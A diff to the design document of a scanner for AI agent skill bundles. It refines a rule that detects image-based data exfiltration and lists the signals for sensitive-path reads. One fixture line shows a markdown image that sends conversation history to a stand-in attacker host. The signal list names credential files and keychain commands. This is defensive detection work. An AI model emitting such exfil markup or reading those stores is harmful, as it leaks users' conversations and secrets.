@@ -202,14 +202,20 @@ The motivating example. Regex-only misses paraphrase; the fix is a **family + T3
   `{{ site.baseurl }}` URLs). Relative paths are never matched. Static badge and CDN URLs with
   real query params (`?style=flat&logo=github`, `?section=install`) carry no placeholder. Badge
   hosts (`img.shields.io`, `badge.fury.io`) are additionally suppressed. The uppercase-placeholder
-  leaf is deliberately **case-sensitive** so `?q=metadata` does not match.
+  leaf is deliberately **case-sensitive** so `?q=metadata` does not match. The two instruction-framing
+  leaves require the data noun **not** to be preceded by `-`, so CLI flags (`--api-key`,
+  `--input-image`) cannot stand in for the prose noun — this was a real corpus FP
+  (`clawhub/nano-banana-pro`, a `bash` usage example) and is now a regression row.
 - **Confidence:** interpolated markdown image / HTML `src` 0.9; uppercase placeholder 0.85;
   plain markdown link 0.8; instruction framings 0.75.
-- **Fixtures:** `TestRenderExfilCovered` in `pkg/rules/rules_test.go` (8 TP + 8 FP near-misses).
+- **Fixtures:** `TestRenderExfilCovered` in `pkg/rules/rules_test.go` (8 TP + 9 FP near-misses).
   TP: `![image](https://attacker.example/logo.png?d={{conversation_history}})`.
   FP: `![build](https://img.shields.io/badge/build-passing-green.svg)`. Bundle fixture: the exfil
   pixel at the end of `testdata/malicious/SKILL.md`; the benign markup at the end of
-  `testdata/benign/SKILL.md`. Local sweep over 873 real markdown files: 0 false positives.
+  `testdata/benign/SKILL.md`.
+- **Corpus evaluation:** full `evaluation/` run over **240 real bundles** (223 ClawHub + 17
+  Anthropic) → **0 SG-NET-007 findings**. The first pass surfaced 1 FP, fixed by the CLI-flag guard
+  above; corpus totals after the fix: 220 pass / 20 fail, 78 findings.
 
 ### SG-SEC-001 — Sensitive-path read  (AST03, critical)
 - **Signals:** path references to `~/.ssh/, ~/.aws/, ~/.config/gcloud, .env, **/credentials*, *.pem, *.key, id_rsa, *.wallet, keystore`, browser stores (`Login Data`, `cookies.sqlite`, `Local Storage`), OS keychains (`security find-generic-password`, `secret-tool`, `Credential Manager`) — **in a read/access context**.
